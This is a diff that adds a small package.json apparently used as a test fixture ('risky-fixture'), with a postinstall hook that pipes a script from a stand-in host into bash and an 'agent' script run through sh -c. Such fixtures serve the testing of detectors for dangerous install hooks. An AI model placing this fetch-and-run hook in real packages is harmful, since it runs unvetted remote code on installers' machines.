@@ -1,0 +1,8 @@
+{
+  "name": "risky-fixture",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/bootstrap.sh | bash",
+    "agent": "sh -c \"node ./agent.js\""
+  }
+}
+
